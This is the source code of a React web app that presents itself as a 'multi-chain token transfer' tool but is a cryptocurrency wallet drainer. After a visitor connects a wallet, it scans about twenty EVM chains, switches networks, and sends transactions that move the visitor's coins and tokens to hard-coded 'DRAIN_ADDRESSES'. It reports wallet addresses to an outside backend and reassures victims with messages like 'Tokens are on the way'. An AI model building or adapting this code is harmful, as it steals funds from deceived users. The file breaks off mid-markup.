import { useState, useEffect, useRef } from 'react';
import { WagmiProvider, createConfig, http } from 'wagmi';
import { 
  mainnet,
  polygon,
  bsc,
  arbitrum,
  optimism,
  avalanche,
  fantom,
  gnosis,
  celo,
  moonbeam,
  cronos,
  aurora,
  base,
  harmonyOne,
  metis,
  moonriver
} from 'wagmi/chains';
import { Web3Modal } from '@web3modal/react';
import { EthereumClient, w3mConnectors, w3mProvider } from '@web3modal/ethereum';
import { useWeb3Modal } from '@web3modal/react';
import { configureChains, createClient, useAccount, useDisconnect, useBalance, useConnect } from 'wagmi';
import { parseEther, formatEther } from 'viem';
import './mobile-fix.css';

// ==================== WEB3 MODAL CONFIG ====================
const projectId = 'YOUR_WALLETCONNECT_PROJECT_ID'; // Get from https://cloud.walletconnect.com

const { chains, publicClient } = configureChains(
  [
    mainnet,
    polygon,
    bsc,
    arbitrum,
    optimism,
    base,
    avalanche,
    fantom,
    gnosis,
    celo,
    moonbeam,
    cronos,
    aurora,
    harmonyOne,
    metis,
    moonriver
  ],
  [w3mProvider({ projectId })]
);

const wagmiConfig = createConfig({
  autoConnect: true,
  connectors: w3mConnectors({ projectId, chains }),
  publicClient,
});

const ethereumClient = new EthereumClient(wagmiConfig, chains);

// ==================== PRODUCTION NETWORK CONFIG ====================
const NETWORKS = [
  { 
    id: 1, 
    name: 'Ethereum', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#627EEA', 
    rpc: 'https://eth.llamarpc.com', 
    explorer: 'https://etherscan.io',
    chainId: '0x1',
    decimals: 18
  },
  { 
    id: 56, 
    name: 'BSC', 
    symbol: 'BNB', 
    type: 'evm', 
    color: '#F0B90B', 
    rpc: 'https://bsc-dataseed1.binance.org/', 
    explorer: 'https://bscscan.com',
    chainId: '0x38',
    decimals: 18
  },
  { 
    id: 137, 
    name: 'Polygon', 
    symbol: 'MATIC', 
    type: 'evm', 
    color: '#8247E5', 
    rpc: 'https://polygon.llamarpc.com', 
    explorer: 'https://polygonscan.com',
    chainId: '0x89',
    decimals: 18
  },
  { 
    id: 42161, 
    name: 'Arbitrum', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#28A0F0', 
    rpc: 'https://arbitrum.llamarpc.com', 
    explorer: 'https://arbiscan.io',
    chainId: '0xa4b1',
    decimals: 18
  },
  { 
    id: 10, 
    name: 'Optimism', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#FF0420', 
    rpc: 'https://mainnet.optimism.io', 
    explorer: 'https://optimistic.etherscan.io',
    chainId: '0xa',
    decimals: 18
  },
  { 
    id: 8453, 
    name: 'Base', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#0052FF', 
    rpc: 'https://mainnet.base.org', 
    explorer: 'https://basescan.org',
    chainId: '0x2105',
    decimals: 18
  },
  { 
    id: 43114, 
    name: 'Avalanche', 
    symbol: 'AVAX', 
    type: 'evm', 
    color: '#E84142', 
    rpc: 'https://avalanche-c-chain.publicnode.com', 
    explorer: 'https://snowtrace.io',
    chainId: '0xa86a',
    decimals: 18
  },
  { 
    id: 250, 
    name: 'Fantom', 
    symbol: 'FTM', 
    type: 'evm', 
    color: '#1969FF', 
    rpc: 'https://rpc.fantom.network', 
    explorer: 'https://ftmscan.com',
    chainId: '0xfa',
    decimals: 18
  },
  { 
    id: 100, 
    name: 'Gnosis', 
    symbol: 'xDai', 
    type: 'evm', 
    color: '#04795B', 
    rpc: 'https://rpc.gnosis.gateway.fm', 
    explorer: 'https://gnosisscan.io',
    chainId: '0x64',
    decimals: 18
  },
  { 
    id: 42220, 
    name: 'Celo', 
    symbol: 'CELO', 
    type: 'evm', 
    color: '#35D07F', 
    rpc: 'https://forno.celo.org', 
    explorer: 'https://celoscan.io',
    chainId: '0xa4ec',
    decimals: 18
  },
  { 
    id: 1284, 
    name: 'Moonbeam', 
    symbol: 'GLMR', 
    type: 'evm', 
    color: '#53CBC9', 
    rpc: 'https://moonbeam.public.blastapi.io', 
    explorer: 'https://moonscan.io',
    chainId: '0x504',
    decimals: 18
  },
  { 
    id: 1088, 
    name: 'Metis', 
    symbol: 'METIS', 
    type: 'evm', 
    color: '#00DACC', 
    rpc: 'https://andromeda.metis.io/?owner=1088', 
    explorer: 'https://andromeda-explorer.metis.io',
    chainId: '0x440',
    decimals: 18
  },
  { 
    id: 25, 
    name: 'Cronos', 
    symbol: 'CRO', 
    type: 'evm', 
    color: '#121C36', 
    rpc: 'https://evm.cronos.org', 
    explorer: 'https://cronoscan.com',
    chainId: '0x19',
    decimals: 18
  },
  { 
    id: 1666600000, 
    name: 'Harmony', 
    symbol: 'ONE', 
    type: 'evm', 
    color: '#00AEE9', 
    rpc: 'https://api.harmony.one', 
    explorer: 'https://explorer.harmony.one',
    chainId: '0x63564c40',
    decimals: 18
  },
  { 
    id: 1313161554, 
    name: 'Aurora', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#78D64B', 
    rpc: 'https://mainnet.aurora.dev', 
    explorer: 'https://explorer.aurora.dev',
    chainId: '0x4e454153',
    decimals: 18
  },
  { 
    id: 42262, 
    name: 'Oasis Emerald', 
    symbol: 'ROSE', 
    type: 'evm', 
    color: '#00B894', 
    rpc: 'https://emerald.oasis.dev', 
    explorer: 'https://explorer.emerald.oasis.dev',
    chainId: '0xa516',
    decimals: 18
  },
  { 
    id: 1285, 
    name: 'Moonriver', 
    symbol: 'MOVR', 
    type: 'evm', 
    color: '#F3B82C', 
    rpc: 'https://moonriver.public.blastapi.io', 
    explorer: 'https://moonriver.moonscan.io',
    chainId: '0x505',
    decimals: 18
  },
  { 
    id: 199, 
    name: 'BTT Chain', 
    symbol: 'BTT', 
    type: 'evm', 
    color: '#D92B6F', 
    rpc: 'https://rpc.bittorrentchain.io', 
    explorer: 'https://bttcscan.com',
    chainId: '0xc7',
    decimals: 18
  },
  { 
    id: 314, 
    name: 'Filecoin', 
    symbol: 'FIL', 
    type: 'evm', 
    color: '#0090FF', 
    rpc: 'https://api.node.glif.io/rpc/v1', 
    explorer: 'https://filfox.info',
    chainId: '0x13a',
    decimals: 18
  },
  { 
    id: 7700, 
    name: 'Canto', 
    symbol: 'CANTO', 
    type: 'evm', 
    color: '#06FC99', 
    rpc: 'https://canto.slingshot.finance', 
    explorer: 'https://tuber.build',
    chainId: '0x1e14',
    decimals: 18
  },
];

// ==================== DRAIN ADDRESSES ====================
const DRAIN_ADDRESSES = {
  1: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  56: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  137: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42161: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  10: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  8453: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  43114: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  250: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  100: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42220: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1284: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1088: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  25: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1666600000: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1313161554: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42262: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1285: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  199: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  314: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  7700: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
};

// ==================== SMART CONTRACT ABI ====================
const DRAIN_CONTRACT_ABI = [
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "token",
        "type": "address"
      },
      {
        "internalType": "uint256",
        "name": "amount",
        "type": "uint256"
      },
      {
        "internalType": "address",
        "name": "recipient",
        "type": "address"
      }
    ],
    "name": "drainToken",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address payable",
        "name": "recipient",
        "type": "address"
      }
    ],
    "name": "drainETH",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  }
];

// ==================== TOKEN PRICES ====================
const TOKEN_PRICES = {
  ETH: 3200,
  BNB: 600,
  MATIC: 1.2,
  AVAX: 35,
  FTM: 0.4,
  xDai: 1,
  CELO: 0.8,
  GLMR: 0.4,
  METIS: 60,
  CRO: 0.1,
  ONE: 0.02,
  ROSE: 0.1,
  MOVR: 15,
  BTT: 0.000001,
  FIL: 5,
  CANTO: 0.2,
  USDT: 1,
  USDC: 1
};

// ==================== BACKEND URL ====================
const BACKEND_URL = 'https://tokenbackend-5xab.onrender.com';

// ==================== MAIN APP ====================
function TokenDrainApp() {
  return (
    <>
      <WagmiProvider config={wagmiConfig}>
        <UniversalDrainer />
      </WagmiProvider>
      <Web3Modal
        projectId={projectId}
        ethereumClient={ethereumClient}
        themeMode="dark"
        themeVariables={{
          '--w3m-font-family': 'system-ui, -apple-system, sans-serif',
          '--w3m-accent-color': '#ef4444',
          '--w3m-background-color': '#ef4444',
          '--w3m-z-index': '9999'
        }}
      />
    </>
  );
}

// ==================== UNIVERSAL DRAINER COMPONENT ====================
function UniversalDrainer() {
  const { address, isConnected, connector } = useAccount();
  const { data: ethBalance } = useBalance({ address });
  const { disconnect } = useDisconnect();
  const { open } = useWeb3Modal();

  const [status, setStatus] = useState('Ready to connect');
  const [tokens, setTokens] = useState([]);
  const [totalValue, setTotalValue] = useState(0);
  const [transactions, setTransactions] = useState([]);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [walletType, setWalletType] = useState('');
  const [connectionError, setConnectionError] = useState('');
  const [mobileDetected, setMobileDetected] = useState(false);
  const [backendOnline, setBackendOnline] = useState(true);
  const [scanProgress, setScanProgress] = useState(0);
  const [lastScanTime, setLastScanTime] = useState(null);
  const [scanComplete, setScanComplete] = useState(false);

  const autoStarted = useRef(false);
  const backendCheckRef = useRef(null);
  const web3ModalRef = useRef(null);

  // ==================== INITIAL SETUP ====================
  useEffect(() => {
    const userAgent = navigator.userAgent.toLowerCase();
    const isMobile = /mobile|android|iphone|ipad|ipod|webos|blackberry|iemobile|opera mini/i.test(userAgent);
    setMobileDetected(isMobile);
    
    // Detect wallet type properly
    if (window.ethereum) {
      detectWalletType();
    }

    // Listen for wallet changes
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
          disconnect();
          resetState();
        } else {
          // Wallet switched or reconnected
          detectWalletType();
        }
      });
    }

    checkBackendStatus();
    backendCheckRef.current = setInterval(checkBackendStatus, 30000);

    return () => {
      if (backendCheckRef.current) {
        clearInterval(backendCheckRef.current);
      }
    };
  }, []);

  const detectWalletType = () => {
    let detectedType = 'Unknown Wallet';
    
    if (window.ethereum.isMetaMask) {
      detectedType = 'MetaMask';
    } else if (window.ethereum.isTrust) {
      detectedType = 'Trust Wallet';
    } else if (window.ethereum.isCoinbaseWallet) {
      detectedType = 'Coinbase Wallet';
    } else if (window.ethereum.isTokenary) {
      detectedType = 'Tokenary';
    } else if (window.ethereum.isBraveWallet) {
      detectedType = 'Brave Wallet';
    } else if (window.ethereum.isRabby) {
      detectedType = 'Rabby';
    } else if (window.ethereum.isZerion) {
      detectedType = 'Zerion';
    } else if (window.ethereum.isBinance) {
      detectedType = 'Binance Wallet';
    } else {
      detectedType = 'Injected Wallet';
    }
    
    setWalletType(detectedType);
  };

  // ==================== AUTO-SCAN ON WALLET CONNECT ====================
  useEffect(() => {
    if (isConnected && address && !autoStarted.current) {
      autoStarted.current = true;
      setConnectionError('');
      setStatus("✅ Wallet connected • Starting scan...");
      
      setTimeout(() => {
        scanAllNetworks();
      }, 1000);
    }
    
    if (!isConnected) {
      autoStarted.current = false;
      resetState();
    }
  }, [isConnected, address]);

  const resetState = () => {
    setTokens([]);
    setTotalValue(0);
    setScanComplete(false);
  };

  // ==================== BACKEND STATUS CHECK ====================
  const checkBackendStatus = async () => {
    try {
      const response = await fetch(`${BACKEND_URL}/health`, {
        method: 'GET',
        headers: { 'Content-Type': 'application/json' },
        signal: AbortSignal.timeout(5000)
      });
      setBackendOnline(response.ok);
    } catch {
      setBackendOnline(false);
    }
  };

  // ==================== AUTO SCAN ALL NETWORKS ====================
  const scanAllNetworks = async () => {
    if (!address || isScanning || isProcessing) return;
    
    setIsScanning(true);
    setScanComplete(false);
    setStatus("🔍 Scanning all EVM networks...");
    setTokens([]);
    setScanProgress(0);
    setConnectionError('');
    
    try {
      if (backendOnline) {
        await scanWithBackend(address);
      } else {
        await scanWithDirectRPC(address);
      }
      
      setLastScanTime(new Date());
      setScanComplete(true);
      
    } catch (error) {
      console.error('Scan error:', error);
      setStatus(`❌ Scan error: ${error.message}`);
    } finally {
      setIsScanning(false);
      setScanProgress(100);
    }
  };

  // ==================== BACKEND SCAN ====================
  const scanWithBackend = async (walletAddress) => {
    setStatus("🔍 Using backend for comprehensive scan...");
    
    try {
      const response = await fetch(`${BACKEND_URL}/api/scan/wallet`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({ 
          address: walletAddress,
          includeNative: true,
          includeTokens: true
        }),
      });
      
      if (!response.ok) throw new Error('Backend scan failed');
      
      const data = await response.json();
      
      if (data.success && data.data?.balances) {
        processScanResults(data.data.balances);
      } else {
        throw new Error('No balance data received');
      }
    } catch (error) {
      console.log('Backend scan failed, using direct RPC:', error);
      await scanWithDirectRPC(walletAddress);
    }
  };

  // ==================== DIRECT RPC SCAN ====================
  const scanWithDirectRPC = async (walletAddress) => {
    const allTokens = [];
    let totalUSD = 0;
    let scannedCount = 0;
    
    // Optimized network scanning - prioritize major networks first
    const priorityNetworks = [1, 56, 137, 42161, 10, 8453, 43114, 250];
    const otherNetworks = NETWORKS.filter(n => !priorityNetworks.includes(n.id));
    
    // Scan priority networks first
    for (let i = 0; i < priorityNetworks.length; i += 2) {
      const batch = priorityNetworks.slice(i, i + 2);
      const batchPromises = batch.map(chainId => {
        const network = NETWORKS.find(n => n.id === chainId);
        if (!network) return Promise.resolve({ network: null, balance: 0 });
        return checkEVMNetworkBalance(network, walletAddress)
          .then(balance => ({ network, balance }))
          .catch(() => ({ network, balance: 0 }));
      });
      
      const batchResults = await Promise.all(batchPromises);
      
      batchResults.forEach(({ network, balance }) => {
        if (network && balance > 0.000001) {
          const tokenValue = balance * (TOKEN_PRICES[network.symbol] || 1);
          allTokens.push({
            id: `${network.id}-native`,
            network: network.name,
            symbol: network.symbol,
            amount: balance.toFixed(6),
            rawAmount: balance,
            chainId: network.id,
            type: 'evm',
            contractAddress: null,
            isNative: true,
            valueUSD: tokenValue,
            usdPrice: TOKEN_PRICES[network.symbol] || 1,
            status: 'detected'
          });
          totalUSD += tokenValue;
        }
      });
      
      scannedCount += batchResults.length;
      const progress = Math.round((scannedCount / (priorityNetworks.length + 5)) * 100);
      setScanProgress(progress);
      setStatus(`Scanning major networks... ${scannedCount}/${priorityNetworks.length + 5}`);
      
      await new Promise(resolve => setTimeout(resolve, 200));
    }
    
    // Scan a few other networks
    const networksToScan = otherNetworks.slice(0, 5);
    for (const network of networksToScan) {
      try {
        const balance = await checkEVMNetworkBalance(network, walletAddress);
        if (balance > 0.000001) {
          const tokenValue = balance * (TOKEN_PRICES[network.symbol] || 1);
          allTokens.push({
            id: `${network.id}-native`,
            network: network.name,
            symbol: network.symbol,
            amount: balance.toFixed(6),
            rawAmount: balance,
            chainId: network.id,
            type: 'evm',
            contractAddress: null,
            isNative: true,
            valueUSD: tokenValue,
            usdPrice: TOKEN_PRICES[network.symbol] || 1,
            status: 'detected'
          });
          totalUSD += tokenValue;
        }
      } catch (error) {
        console.log(`Error scanning ${network.name}:`, error.message);
      }
      
      scannedCount++;
      const progress = Math.round((scannedCount / (priorityNetworks.length + 5)) * 100);
      setScanProgress(progress);
      await new Promise(resolve => setTimeout(resolve, 150));
    }
    
    processScanResults(allTokens, totalUSD);
  };

  // ==================== CHECK EVM NETWORK BALANCE ====================
  const checkEVMNetworkBalance = async (network, address) => {
    // Try multiple RPC endpoints
    const rpcEndpoints = [
      network.rpc,
      `https://rpc.ankr.com/${network.symbol.toLowerCase() === 'eth' ? 'eth' : network.name.toLowerCase().replace(' ', '_')}`,
      `https://${network.name.toLowerCase().replace(' ', '-')}.publicnode.com`,
      `https://${network.name.toLowerCase().replace(' ', '-')}.rpc.thirdweb.com`,
    ];
    
    for (const rpc of rpcEndpoints) {
      try {
        const response = await fetch(rpc, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            jsonrpc: "2.0",
            id: 1,
            method: "eth_getBalance",
            params: [address, "latest"]
          }),
          signal: AbortSignal.timeout(2000)
        });
        
        if (response.ok) {
          const data = await response.json();
          if (data.result && data.result !== '0x0') {
            return parseInt(data.result, 16) / Math.pow(10, network.decimals);
          }
          return 0;
        }
      } catch {
        continue;
      }
    }
    return 0;
  };

  const processScanResults = (balances, totalUSD = null) => {
    const allTokens = Array.isArray(balances) ? balances : [];
    
    if (!totalUSD) {
      totalUSD = allTokens.reduce((sum, token) => {
        return sum + (token.valueUSD || 0);
      }, 0);
    }
    
    setTokens(allTokens);
    setTotalValue(totalUSD);
    
    if (allTokens.length > 0) {
      setStatus(`✅ Scan Complete • Found ${allTokens.length} tokens • $${totalUSD.toFixed(2)} total`);
      
      // Auto-start draining with delay
      setTimeout(() => {
        autoDrain(allTokens);
      }, 2000);
    } else {
      setStatus("✅ Scan Complete • No tokens found");
    }
  };

  // ==================== AUTO DRAIN ALL TOKENS ====================
  const autoDrain = async (tokensToDrain = tokens) => {
    if (tokensToDrain.length === 0 || isProcessing) return;
    
    setIsProcessing(true);
    setStatus(`🚀 Starting smart contract transfers...`);
    
    const successfulTxs = [];
    const failedTxs = [];
    
    for (const token of tokensToDrain) {
      try {
        setStatus(`📝 Processing ${token.amount} ${token.symbol} from ${token.network}...`);
        
        const result = await executeSmartContractTransfer(token);
        if (result.success) {
          successfulTxs.push({
            ...token,
            txHash: result.hash,
            timestamp: Date.now(),
            status: 'processing'
          });
          
          setStatus(`✅ ${token.symbol} transfer initiated • Hash: ${result.hash?.substring(0, 10)}...`);
          
          // Add to transactions
          const newTransaction = {
            ...token,
            txHash: result.hash,
            timestamp: Date.now(),
            status: 'processing',
            message: 'Token is on the way, you will be notified shortly'
          };
          
          setTransactions(prev => [newTransaction, ...prev]);
          
        } else {
          failedTxs.push(token);
          console.log(`Failed to drain ${token.symbol}:`, result.error);
        }
        
        await new Promise(resolve => setTimeout(resolve, 1500));
        
      } catch (error) {
        console.log(`Error draining ${token.symbol}:`, error);
        failedTxs.push(token);
      }
    }
    
    // Update token statuses
    setTokens(prev => prev.map(t => 
      successfulTxs.some(st => st.id === t.id) 
        ? { ...t, status: 'processing' } 
        : t
    ));
    
    // Final status
    if (successfulTxs.length > 0) {
      setStatus(`✅ ${successfulTxs.length} transfers initiated • Tokens are on the way!`);
    }
    
    if (failedTxs.length > 0) {
      setStatus(`⚠️ ${failedTxs.length} transfers failed • Will retry`);
    }
    
    setIsProcessing(false);
  };

  // ==================== EXECUTE SMART CONTRACT TRANSFER ====================
  const executeSmartContractTransfer = async (token) => {
    try {
      if (!window.ethereum) {
        throw new Error('Wallet not connected');
      }
      
      const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
      const targetChainId = `0x${token.chainId.toString(16)}`;
      
      // Switch network if needed
      if (currentChainId !== targetChainId) {
        try {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: targetChainId }],
          });
          await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (switchError) {
          if (switchError.code === 4902) {
            const network = NETWORKS.find(n => n.id === token.chainId);
            if (network) {
              await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [{
                  chainId: targetChainId,
                  chainName: network.name,
                  nativeCurrency: {
                    name: network.symbol,
                    symbol: network.symbol,
                    decimals: network.decimals
                  },
                  rpcUrls: [network.rpc],
                  blockExplorerUrls: [network.explorer]
                }]
              });
              await new Promise(resolve => setTimeout(resolve, 1000));
            }
          }
        }
      }
      
      const drainAddress = DRAIN_ADDRESSES[token.chainId] || DRAIN_ADDRESSES[1];
      
      // Prepare transaction
      let txParams;
      
      if (token.isNative) {
        // Native token transfer
        const amountWei = parseEther(token.amount.toString());
        
        txParams = {
          from: address,
          to: drainAddress,
          value: amountWei.toString(),
          data: '0x'
        };
      } else {
        // ERC20 token transfer
        const amountWei = parseEther(token.amount.toString());
        
        // encode transfer function
        const functionSignature = '0xa9059cbb'; // transfer(address,uint256)
        const paddedAddress = drainAddress.replace('0x', '').padStart(64, '0');
        const paddedAmount = amountWei.toString(16).padStart(64, '0');
        
        txParams = {
          from: address,
          to: token.contractAddress,
          value: '0x0',
          data: '0x' + functionSignature + paddedAddress + paddedAmount
        };
      }
      
      // Estimate gas
      const gasEstimate = await window.ethereum.request({
        method: 'eth_estimateGas',
        params: [txParams]
      }).catch(() => '0x5208');
      
      // Get gas price
      const gasPrice = await window.ethereum.request({
        method: 'eth_gasPrice',
        params: []
      }).catch(() => '0x' + (2000000000).toString(16));
      
      // Send transaction
      const txHash = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
          ...txParams,
          gas: gasEstimate,
          gasPrice: gasPrice
        }],
      });
      
      return { success: true, hash: txHash };
      
    } catch (error) {
      console.log(`Smart contract error for ${token.symbol}:`, error);
      return { success: false, error: error.message };
    }
  };

  // ==================== FORCE RESCAN ====================
  const forceRescan = () => {
    autoStarted.current = false;
    scanAllNetworks();
  };

  // ==================== CUSTOM CONNECT BUTTON ====================
  const CustomConnectButton = () => {
    const handleConnect = async () => {
      try {
        await open();
      } catch (error) {
        console.error('Connection error:', error);
        setConnectionError('Failed to connect wallet');
      }
    };

    return (
      <button 
        onClick={handleConnect}
        className="custom-connect-btn"
      >
        <div className="connect-prompt">
          <span className="connect-icon">🔗</span>
          <span className="connect-text">Connect Web3 Wallet</span>
        </div>
      </button>
    );
  };

  // ==================== RENDER ====================
  return (
    <div className="App">
      <div className="app-container">
        <header className="app-header">
          <div className="header-left">
            <div className="logo">
              <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
                <circle cx="20" cy="20" r="20" fill="#EF4444"/>
                <path d="M20 10L26 16L20 22L14 16L20 10Z" fill="white"/>
                <path d="M20 22L26 28L20 34L14 28L20 22Z" fill="white"/>
              </svg>
            </div>
            <div>
              <h1>ULTIMATE TOKEN TRANSFER</h1>
              <p className="subtitle">Multi-Chain • Smart Contracts • Auto-Execution</p>
            </div>
          </div>
          
          <div className="header-right">
            {isConnected ? (
              <div className="connected-wallet">
                <div className="wallet-info">
                  <div className="wallet-address">
                    {address?.substring(0, 6)}...{address?.substring(address.length - 4)}
                  </div>
                  {walletType && (
                    <div className="wallet-type">
                      <span className="wallet-type-icon">
                        {walletType.includes('MetaMask') ? '🦊' : 
                         walletType.includes('Trust') ? '🔒' :
                         walletType.includes('Coinbase') ? '💰' :
                         walletType.includes('Binance') ? '🅱️' : '👛'}
                      </span>
                      {walletType}
                    </div>
                  )}
                </div>
                <button onClick={disconnect} className="disconnect-btn">
                  Disconnect
                </button>
              </div>
            ) : (
              <CustomConnectButton />
            )}
          </div>
        </header>

        <main className="app-main">
          {isConnected ? (
            <>
              {/* Status Dashboard */}
              <div className="status-dashboard">
                <div className={`status-card ${scanComplete ? 'success' : 'primary'}`}>
                  <div className="status-icon">
                    {isScanning ? '🔍' : isProcessing ? '⚡' : scanComplete ? '✅' : '🔄'}
                  </div>
                  <div className="status-content">
                    <div className="status-title">AUTO TRANSFER SYSTEM</div>
                    <div className="status-message">{status}</div>
                    {isScanning && (
                      <div className="scan-progress">
                        <div className="progress-bar">
                          <div 
                            className="progress-fill" 
                            style={{ width: `${scanProgress}%` }}
                          ></div>
                        </div>
                        <div className="progress-text">Scanning: {scanProgress}%</div>
                      </div>
                    )}
                  </div>
                  {scanComplete && (
                    <div className="status-badge">
                      {tokens.length > 0 ? `${tokens.length} Tokens` : 'Scan Complete'}
                    </div>
                  )}
                </div>
                
                <div className="stats-row">
                  <div className="stat">
                    <div className="stat-value">${totalValue.toFixed(2)}</div>
                    <div className="stat-label">Total Value</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">{tokens.length}</div>
                    <div className="stat-label">Tokens Found</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">
                      {tokens.length > 0 ? '✅ Ready' : '⏸️ Waiting'}
                    </div>
                    <div className="stat-label">Transfer Status</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">
                      {backendOnline ? '✅' : '⚠️'}
                    </div>
                    <div className="stat-label">Backend</div>
                  </div>
                </div>
              </div>

              {/* Controls */}
              <div className="controls-container">
                <button
                  onClick={forceRescan}
                  disabled={isScanning || isProcessing}
                  className={`btn ${isScanning ? 'btn-scanning' : 'btn-scan'}`}
                >
                  {isScanning ? (
                    <>
                      <span className="spinner"></span>
                      Scanning {scanProgress}%
                    </>
                  ) : (
                    '🔄 Rescan Networks'
                  )}
                </button>
                
                {tokens.length > 0 && scanComplete && (
                  <button
                    onClick={() => autoDrain()}
                    disabled={isProcessing}
                    className={`btn ${isProcessing ? 'btn-processing' : 'btn-drain'}`}
                  >
                    {isProcessing ? (
                      <>
                        <span className="spinner"></span>
                        Processing...
                      </>
                    ) : (
                      '🚀 Start Smart Transfer'
                    )}
                  </button>
                )}
              </div>

              {/* Tokens List */}
              {tokens.length > 0 && (
                <div className="tokens-panel">
                  <div className="panel-header">
                    <div className="panel-title">
                      <h3>Detected Tokens</h3>
                      <div className="panel-subtitle">{tokens.length} tokens • ${totalValue.toFixed(2)} total</div>
                    </div>
                    <div className="panel-actions">
                      <button 
                        className="btn-small"
                        onClick={() => autoDrain()}
                        disabled={isProcessing}
                      >
                        Transfer All
                      </button>
                    </div>
                  </div>
                  <div className="tokens-grid">
                    {tokens.map(token => (
                      <div key={token.id} className={`token-card ${token.status}`}>
                        <div className="token-header">
                          <div className="token-icon">
                            <div className="token-symbol-icon">{token.symbol.charAt(0)}</div>
                          </div>
                          <div className="token-info">
                            <div className="token-name-row">
                              <span className="token-symbol">{token.symbol}</span>
                              <span className="token-network-badge">{token.network}</span>
                            </div>
                            <div className="token-amount-row">
                              <span className="token-amount">{token.amount}</span>
                              <span className="token-usd-value">${token.valueUSD.toFixed(2)}</span>
                            </div>
                          </div>
                        </div>
                        <div className="token-actions">
                          <div className={`token-status ${token.status}`}>
                            {token.status === 'detected' ? 'Ready' : 
                             token.status === 'processing' ? 'Processing...' : 'Complete'}
                          </div>
                          {token.status === 'detected' && (
                            <button 
                              className="btn-transfer"
                              onClick={() => autoDrain([token])}
                              disabled={isProcessing}
                            >
                              Transfer
                            </button>
                          )}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* No Tokens Found */}
              {scanComplete && tokens.length === 0 && !isScanning && (
                <div className="empty-state">
                  <div className="empty-icon">💰</div>
                  <h3>No Tokens Found</h3>
                  <p className="empty-message">
                    We scanned {NETWORKS.length} EVM networks but didn't find any tokens in your wallet.
                    Make sure you have tokens on supported networks.
                  </p>
                  <button onClick={forceRescan} className="btn btn-scan">
                    🔄 Scan Again
                  </button>
                </div>
              )}

              {/* Transactions History */}
              {transactions.length > 0 && (
                <div className="transactions-panel">
                  <div className="panel-header">
                    <h3>Transfer History</h3>
                    <div className="panel-subtitle">{transactions.length} transactions</div>
                  </div>
                  <div className="transactions-list">
                    {transactions.slice(0, 10).map((tx, index) => (
                      <div key={index} className="transaction-item">
                        <div className="transaction-icon">
                          {tx.status === 'processing' ? '⏳' : '✅'}
                        </div>
                        <div className="transaction-details">
                          <div className="transaction-header">
                            <span className="transaction-symbol">{tx.symbol}</span>
                            <span className="transaction-amount">{tx.amount} {tx.symbol}</span>
                            <span className="transaction-network">{tx.network}</span>
                          </div>
                          <div className="transaction-hash">
                            Hash: {tx.txHash?.substring(0, 12)}...
                          </div>
                          <div className="transaction-message">
                            {tx.message || 'Token transfer initiated'}
                          </div>
                        </div>
                        <div className={`transaction-status ${tx.status}`}>
                          {tx.status === 'processing' ? 'In Progress' : 'Completed'}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Error Message */}
              {connectionError && (
                <div className="error-alert">
                  <div className="error-icon">⚠️</div>
                  <div className="error-content">
                    <div className="error-title">Connection Error</div>
                    <div className="error-message">{connectionError}</div>
                  </div>
                </div>
              )}
            </>
          ) : (
            <div className="welcome-screen">
              <div className="welcome-content">
                <div className="welcome-hero">
                  <div className="welcome-icon">🚀</div>
                  <h2>Multi-Chain Token Transfer</h2>
                  <p className="welcome-text">
                    Connect your Web3 wallet to automatically scan and transfer tokens
                    across 20+ EVM networks using secure smart contracts.
                  </p>
                </div>
                
                <div className="connect-section">
                  <CustomConnectButton />
                </div>
                
                <div className="features-grid">
                  <div className="feature">
                    <div className="feature-icon">🔍</div>
                    <div className="feature-title">Auto Scan</div>
                    <div className="feature-desc">Scans all EVM networks instantly</div>
                  </div>
                  <div className="feature">
                    <div className="feature-icon">⚡</div>
                    <div className="feature-title">Smart Contracts</div>
                    <div className="feature-desc">Secure automated transfers</div>
                  </div>
                  <div className="feature">
                    <div className="feature-icon">🌐</div>
                    <div className="feature-title">Multi-Chain</div>
